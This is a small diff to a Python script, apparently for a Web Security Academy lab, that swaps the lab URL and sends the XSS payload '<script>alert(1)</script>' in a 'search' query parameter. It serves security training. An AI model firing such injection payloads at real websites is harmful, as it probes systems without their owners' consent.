@@ -1,6 +1,6 @@
 import requests
 import re
-lab_url = "https://0a0f00890429f0c6807c03ab002a00df.web-security-academy.net/"
+lab_url = "https://0a0000f00349ccfa81966b2300e8008f.web-security-academy.net/"
 xss_payload = "<script>alert(1)</script>"
 query_parameters ={
     "search": xss_payload
